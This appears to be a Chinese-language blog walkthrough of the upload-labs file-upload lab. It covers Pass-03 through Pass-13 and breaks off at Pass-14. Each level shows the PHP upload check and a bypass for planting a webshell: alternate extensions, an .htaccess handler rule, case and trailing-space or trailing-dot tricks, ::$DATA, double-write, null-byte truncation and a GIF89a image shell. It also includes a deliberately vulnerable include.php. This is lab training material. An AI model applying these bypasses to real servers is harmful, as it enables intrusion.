title="解法"></a>解法</h2><p>这次是屏蔽了所有的<code>.asp</code>、<code>.aspx</code>、<code>.php</code>、<code>.jsp</code>文件，但是黑名单定义不完全是可以绕过的可以用<code>.phtml</code>、<code>.phps</code>、<code>.php5</code>、<code>.pht</code>进行绕过。比如将文件名改为<code>webshell.php5</code>上传。<br>但是要想上传后能执行，要在自己的<code>apache</code>的<code>httpd.conf</code>文件写入，在<code>D:\你安装的位置\phpstudy_pro\Extensions\Apache2.4.39\conf</code>里写入：<br><code>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</code><br>这样就成功传输和使用了。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p><strong>如果这样还是不行的话，就是php版本的问题，需要将Nts版本换为ts版本：</strong><a href="https://www.cnblogs.com/Article-kelp/p/14927087.html"><strong>https://www.cnblogs.com/Article-kelp/p/14927087.html</strong></a></p><h1 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;收尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . $_FILES[&#39;upload_file&#39;][&#39;name&#39;];                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传!&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h2><p>这下禁止上传的文件类型有很多种，我们可以尝试传一个<code>.htaccess</code>文件来把<code>.png</code>文件解析为<code>.php</code>类型</p><pre class="language-php" data-language="php"><code class="language-php">&lt;FilesMatch &quot;webshell.png&quot;&gt;SetHandler application&#x2F;x-httpd-php&lt;&#x2F;FilesMatch&gt;</code></pre><h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空        if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h2><p>相比与第四关，第五关少了转换为小写的这一步骤，因此可以尝试修改为<code>.Php</code>后缀上传，连接成功。</p><h1 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA                if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h2><p>这次的代码和之前相比少了首尾去空，因此可以尝试在末尾加上空格，但是我们在本地是无法在末尾添加上空格的，所以需要在burpsuite抓包中修改上传的文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673682906593-0bfa79c4-182f-48d5-b349-280cda650687.png" alt="e4d6f42cc4fc3bf888b6ceb79f1001e.png"><br>这样就可以上传成功。</p><h1 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了删除文件末尾的点，因此可以在文件末尾添加点来绕过，还是直接在bp中修改文件名并上传即可。</p><h1 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h2><p>这次缺少了对字符串<code>::$DATA</code>的检测，因此使用bp在文件末尾添加对应字符，连接成功。<br>查询之后发现：在window的时候如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，他的目的就是不检查后缀名<br>例如:”<code>phpinfo.php::$DATA</code>“Windows会自动去掉末尾的<code>::$DATA</code>变成”<code>phpinfo.php</code>“</p><h1 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; deldot($file_name);&#x2F;&#x2F;删除文件名末尾的点        $file_ext &#x3D; strrchr($file_name, &#39;.&#39;);        $file_ext &#x3D; strtolower($file_ext); &#x2F;&#x2F;转换为小写        $file_ext &#x3D; str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);&#x2F;&#x2F;去除字符串::$DATA        $file_ext &#x3D; trim($file_ext); &#x2F;&#x2F;首尾去空                if (!in_array($file_ext, $deny_ext)) &#123;            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) &#123;                $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;                $is_upload &#x3D; true;            &#125;        &#125; else &#123;            $msg &#x3D; &#39;此文件不允许上传&#39;;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-7"><a href="#解法-7" class="headerlink" title="解法"></a>解法</h2><p>这次发现把前面能用的几种方法全部堵死了。但是可以发现：php文件会先删除.，再删除空格。所以可以修改后缀为<code>webshell.php. .</code>来绕过，经过处理之后变成<code>webshell.php.</code>，这样就可以上传了。</p><h1 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if (isset($_POST[&#39;submit&#39;])) &#123;    if (file_exists($UPLOAD_ADDR)) &#123;        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name &#x3D; trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]);        $file_name &#x3D; str_ireplace($deny_ext,&quot;&quot;, $file_name);        if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name)) &#123;            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;            $is_upload &#x3D; true;        &#125;    &#125; else &#123;        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;    &#125;&#125;</code></pre><h2 id="解法-8"><a href="#解法-8" class="headerlink" title="解法"></a>解法</h2><p>这次会对违规的部分直接移除，导致上传的php后缀文件后缀缺失。这种情况下，这种移除的情况都可以使用双写绕过，即修改为<code>webshell.pphphp</code>上传，这样上传后的文件后缀就会修改为正常的<code>.php</code>，可以正常连接。</p><h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload &#x3D; true;        &#125;        else&#123;            $msg &#x3D; &#39;上传失败！&#39;;        &#125;    &#125;    else&#123;        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</code></pre><h2 id="解法-9"><a href="#解法-9" class="headerlink" title="解法"></a>解法</h2><p>这次是使用白名单过滤，而且</p><pre class="language-php" data-language="php"><code class="language-php">$img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>所以可以使用%00的截断绕过，即：<br>先上传<code>webshell.jpg</code>然后使用bp抓包，将<code>save_path</code>参数修改为以下即可上传：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673689610306-ac532bbc-e2d6-4061-b1f3-377b4bb35972.png" alt="image.png"></p><h2 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h2><p>php版本要小于<code>5.3.4</code> 修改<code>php.ini</code>的<code>magic_quotes_gpc</code>为OFF状态</p><h1 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);    $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);    if(in_array($file_ext,$ext_arr))&#123;        $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];        $img_path &#x3D; $_POST[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload &#x3D; true;        &#125;        else&#123;            $msg &#x3D; &quot;上传失败&quot;;        &#125;    &#125;    else&#123;        $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;    &#125;&#125;</code></pre><h2 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h2><p>与上一关相比，这次的<code>save_path</code>参数是在<code>POST</code>内的，但是在<code>POST</code>中加<code>%00</code>参数不行，因为会被解析为字符串，但肯定还是使用<code>00</code>来截断，因此这道题需要修改<code>hex</code>。<br>先上传<code>webshell.jpg</code>文件，修改保存路径，并在末尾添加一个字符<code>a</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771713001-3916d4ff-baf3-42db-b504-02a210287690.png" alt="image.png"><br>然后打开Burpsuite的<code>Hex</code>模式，找到对应<code>a</code>字符的hex值修改为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771889576-21235d91-3988-49a5-a490-67217b152112.png" alt="image.png"><br>也可以raw模式下选中a修改hex为00<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673771934277-9f2bddb4-fe97-41cf-90ce-64de637342fa.png" alt="image.png"></p><h1 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h1><pre class="language-php" data-language="php"><code class="language-php">function getReailFileType($filename)&#123;    $file &#x3D; fopen($filename, &quot;rb&quot;);    $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节    fclose($file);    $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin);        $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]);        $fileType &#x3D; &#39;&#39;;        switch($typeCode)&#123;              case 255216:                        $fileType &#x3D; &#39;jpg&#39;;            break;        case 13780:                        $fileType &#x3D; &#39;png&#39;;            break;                case 7173:                        $fileType &#x3D; &#39;gif&#39;;            break;        default:                        $fileType &#x3D; &#39;unknown&#39;;        &#125;            return $fileType;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123;    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];    $file_type &#x3D; getReailFileType($temp_file);    if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123;        $msg &#x3D; &quot;文件未知，上传失败！&quot;;    &#125;else&#123;        $img_path &#x3D; $UPLOAD_ADDR.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type;        if(move_uploaded_file($temp_file,$img_path))&#123;            $is_upload &#x3D; true;        &#125;        else&#123;            $msg &#x3D; &quot;上传失败&quot;;        &#125;    &#125;&#125;</code></pre><h2 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h2><p><code>getReailFileType()</code>函数获取文件的最开始两个字节，来判断文件类型，因此可以使用图片文件欺骗来进行攻击。不同类型文件文件头标准编码是不同的：</p><pre class="language-php" data-language="php"><code class="language-php">JPEG (jpg)，文件头：FF D8 FFPNG (png)，文件头：89 50 4E 47     【参考：png文件头详解】89 50 4e 47 0d 0a 1a 0aGIF (gif)，文件头：47 49 46 38 &#x2F;&#x2F;常用47 49 46 38 39 61 标识GIF89aWindows Bitmap (bmp)，文件头：42 4D [参考：bmp文件格式详解]42 4D 36 0C 30 00 00 00 00 00 36 00 00 00 28 00 00 00 56 05 00 00 00 03 00 00 01 00 18 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00python反编译文件pyc的头：03 F3 0D 0A  （实验吧，py的交易会用到）pyd的文件头：4D 5A 90 00ZIP Archive (zip)，文件头：50 4B 03 04 ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件rar文件: 52 61 72 217z文件头：37 7A BC AF 27 1C（实验吧，有趣的文件用到了）MS Word&#x2F;Excel (xls.or.doc)，文件头：D0CF11E0CAD (dwg)，文件头：41433130Adobe Photoshop (psd)，文件头：38425053Rich Text Format (rtf)，文件头：7B5C727466XML (xml)，文件头：3C3F786D6CHTML (html)，文件头：68746D6C3EEmail [thorough only] (eml)，文件头：44656C69766572792D646174653AOutlook Express (dbx)，文件头：CFAD12FEC5FD746FOutlook (pst)，文件头：2142444EMS Access (mdb)，文件头：5374616E64617264204AWordPerfect (wpd)，文件头：FF575043Postscript (eps.or.ps)，文件头：252150532D41646F6265Adobe Acrobat (pdf)，文件头：255044462D312EQuicken (qdf)，文件头：AC9EBD8FWindows Password (pwl)，文件头：E3828596RAR Archive (rar)，文件头：52617221Wave (wav)，文件头：57415645AVI (avi)，文件头：41564920Real Audio (ram)，文件头：2E7261FDReal Media (rm)，文件头：2E524D46MPEG (mpg)，文件头：000001BAMPEG (mpg)，文件头：000001B3Quicktime (mov)，文件头：6D6F6F76Windows Media (asf)，文件头：3026B2758E66CF11MIDI (mid)，文件头：4D546864</code></pre><p>因此，可以在文件前添加<code>GIF89a</code>来迷惑文件检测<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673778087346-92bc1307-babe-4ad4-b1c5-85473c31f677.png" alt="image.png"><br>添加之后上传，上传成功，但是这时候文件后缀是<code>.gif</code>格式，这道题要求的是上传图片马，因此到这里即可，我们可以测试一下是否可以使用。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>我们在本地创建一个<code>include.php</code>文件</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*&#x2F;header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123;    include $file;&#125;else&#123;    show_source(__file__);&#125;?&gt;</code></pre><p>然后保存到<code>upload-labs</code>的目录下即可（与upload文件夹同级），保存之后，用antsword连接<br><code>http://你的ip/upload-labs/include.php?file=upload/文件名称</code>，如果可以连接则说明图片马上传成功。（注意，这道题上传的图片马会改名字，修改的名字在response传回时会显示）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673782519464-3fcd10b2-4cc6-4d71-9e53-2326825163ca.png" alt="image.png"></p><h1 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h1><pre class="language-php" data-language="php"><code 